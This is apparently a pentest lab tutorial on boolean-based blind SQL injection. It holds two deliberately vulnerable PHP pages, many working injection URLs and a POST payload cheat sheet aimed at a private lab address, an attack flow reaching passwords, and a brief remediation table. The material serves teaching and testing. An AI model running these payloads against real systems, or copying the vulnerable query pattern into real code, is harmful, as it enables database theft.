error na aya tab true false use karte hai

# 🔒 Boolean-Based Blind SQL Injection

> ⚡ _A structured walkthrough of the Boolean-Based Blind SQL Injection technique — covering vulnerable source code, GET & POST variants, and manual extraction payloads._

---

## 📂 Overview

Boolean-Based Blind SQL Injection is a technique where an attacker injects SQL conditions that evaluate to **true** or **false**. The attacker doesn't see query output directly — instead, they observe **differences in the application's behavior** (e.g., content appearing or disappearing) to infer data one bit at a time.

---

## 📄 Source Code — `blind-injection-boolean-type.php` (GET Version)

```php
<?php

    // Include database connection file
    include("connection.php");

?>

<!DOCTYPE html>
<html>
<head>
    <title>Blind Injection Boolean Type</title>
</head>
<body>

    <div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">
        <h1><span class="style4">Blind Injection Boolean Type</span> <br>
        <font size="3" color="#666666">

        <?php

            // Check if 'id' parameter is present in URL
            if (isset($_GET['id'])) {

                // VULNERABILITY: Direct assignment of user input without sanitization
                // This allows attackers to inject malicious SQL code
                $id = $_GET['id'];

                // VULNERABILITY: User input is directly concatenated into SQL query
                // No prepared statements or parameterized queries used
                // Example attack: ?id=1' AND LENGTH(DATABASE())=7--
                $query = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";

                // Display the SQL query (helps attacker see injection structure)
                // This should be disabled in production environments
                echo $query . "</br>";

                // Execute the vulnerable query
                $result = mysqli_query($connection, $query);

                // BOOLEAN-BASED BLIND SQL INJECTION POINT:
                // If query returns results, user sees "Your ID in Our Database"
                // If query returns no results (false condition), nothing is displayed
                // Attackers use this behavior difference to extract data bit by bit
                while ($row = mysqli_fetch_assoc($result)) {
                    echo '<font color= "#0000ff">';
                    echo "Your ID in Our Database";
                    echo "<br>";
                    echo "Your User Name in Our Database";
                    echo "</font>";
                }

            }

        ?>

            </font> </h1>
    </div>
    </br></br></br>

</body>
</html>
```

---

## 📄 Source Code — `blind-injection-boolean-type-post.php` (POST Version)

```php
<?php

    // Include database connection file
    include("connection.php");

?>

<!DOCTYPE html>
<html>
<head>
    <title>Blind Injection Boolean Type</title>
</head>
<body>

    <div style=" margin-top:70px; font-size:23px; text-align:center">
        <h1><span class="style4">Blind Injection Boolean Type</span> <br>
        <font size="3" color="#666666">

        <!-- HTML form that submits user input via POST method -->
        <!-- POST method makes injection harder to detect in URL logs -->
        <!-- but does NOT prevent SQL injection attacks -->
        <form action="blind-injection-boolean-type-post.php" method="POST">

            User ID Search: <input type="text" name="id" value="" /> <br />
            <input type="submit" name="submit" value="Search" />

        </form>

        <?php

            // Check if 'id' parameter was submitted via POST
            if (isset($_POST['id'])) {

                // VULNERABILITY: Direct assignment of user input without sanitization
                // Attacker can inject SQL through POST data using tools like Burp Suite or curl
                // Example malicious input: 1' AND LENGTH(DATABASE())=7-- -
                $id = $_POST['id'];

                // VULNERABILITY: User input is directly concatenated into SQL query
                // No prepared statements or parameterized queries used
                // This allows SQL injection even though POST method is used
                $query = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";

                // Query display is commented out (good practice for production)
                // But vulnerability still exists - hiding the query doesn't fix the problem
                //echo $query . "</br>";

                // Execute the vulnerable query against the database
                $result = mysqli_query($connection, $query);

                // BOOLEAN-BASED BLIND SQL INJECTION EXPLOITATION POINT:
                // - If injected condition is TRUE: Loop executes, displays "Your ID in Our Database"
                // - If injected condition is FALSE: Loop doesn't execute, displays nothing
                //
                // Attackers observe this behavioral difference to extract data:
                // Example POST payload: id=1' AND ASCII(SUBSTR(DATABASE(),1,1))=97-- -
                // - If first character of database name is 'a' (ASCII 97): message appears
                // - If not: no message appears
                //
                // By testing different characters/conditions systematically,
                // attacker can reconstruct entire database name, table names, passwords, etc.

                while ($row = mysqli_fetch_assoc($result)) {
                    echo '<font color= "#0000ff">';
                    echo "Your ID in Our Database";
                    echo "<br>";
                    echo "Your User Name in Our Database";
                    echo "</font>";
                }

            }

        ?>

            </font> </h1>
    </div>
    </br></br></br>

</body>
</html>
```

---

## 🧪 Exploitation — Test URLs (GET)

### 1️⃣ Retrieve Normal Records (No Injection)

```
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=2
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=3
```

---

### 2️⃣ Test Basic SQL Injection Point

```
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1'
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' --+
```

---

### 3️⃣ Boolean Conditions — Manipulating Query Logic

```
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND 1 --+      (Always TRUE)
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND 0 --+      (Always FALSE)
```

---

## 🧪 Exploitation — Extract Database Information Using Boolean Checks

### 📌 Check Current Database

```
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select database()) --+
```

### 📌 Check Length of the Database Name

```
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select length(database())) --+
```

### 📌 Boolean Checks on Database Name Length

```
Length = 15:
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select length(database()) = 15) --+

Length > 15:
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select length(database()) > 15) --+

Length < 15:
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select length(database()) < 15) --+

Length = 7:
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select length(database()) = 7) --+

Length > 5:
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select length(database()) > 5) --+

Length < 4:
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select length(database()) < 4) --+

Length = 8:
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select length(database()) = 8) --+

Length = 9:
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select length(database()) = 9) --+
```

### 📌 Extract Database Name Characters by ASCII Value Comparisons

```
First character ASCII < 100:
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select ascii(substr(database(),1,1)) < 100) --+

First character ASCII > 97:
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select ascii(substr(database(),1,1)) > 97) --+

First character ASCII = 97 ('a'):
http://192.168.1.31/web-pentest/blind-injection-boolean-type.php?id=1' AND (select ascii(substr(database(),1,1)) = 97) --+
```

> 🔄 Repeat `substr(database(), N, 1)` incrementing N for each position to reconstruct the full database name.

---

## 📋 Payload Cheat Sheet (POST Compatible)

### Basic Injection Techniques

Terminate the current SQL statement and comment out the rest:

```
1' --
1' #
```

These end the query string after `id='1'` and comment out anything following, effectively ignoring the rest of the query.

### Boolean Conditions (Always True / False)

```
1' AND 1 --    (always true)
1' AND 0 --    (always false)
1' AND 1 #     (always true)
1' AND 0 #     (always false)
```

### Extract Database Information

Check length of the current database name:

```
1' AND (select length(database()) = 9) #
1' AND (select length(database()) = 8) #
```

Extract character data by ASCII comparison of the first character of the database name:

```
1' AND (select ascii(substr(database(),1,1)) < 100) #
1' AND (select ascii(substr(database(),1,1)) = 95)  #
```

---

## 🗺️ Attack Flow Summary

```
[1] Confirm injection point        →  1' --          (does the page behave differently?)
        ↓
[2] Confirm boolean behavior       →  1' AND 1 --   vs   1' AND 0 --
        ↓
[3] Determine target length        →  Binary search on length(database())
        ↓
[4] Extract character by character →  ASCII comparison on substr(database(), N, 1)
        ↓
[5] Reconstruct full value         →  Repeat for tables, columns, passwords…
```

---

## 🛡️ Remediation

|❌ Vulnerable Pattern|✅ Secure Alternative|
|---|---|
|`$id = $_GET['id']` / `$_POST['id']`|Validate & cast: `$id = (int)$_GET['id']`|
|String concatenation in queries|Use **prepared statements** (`mysqli_stmt`)|
|`echo $query` in output|**Never** expose raw queries to users|
|No input validation|Whitelist allowed values / use parameterized queries|

---

_📝 This document is for authorized penetration testing and educational purposes only._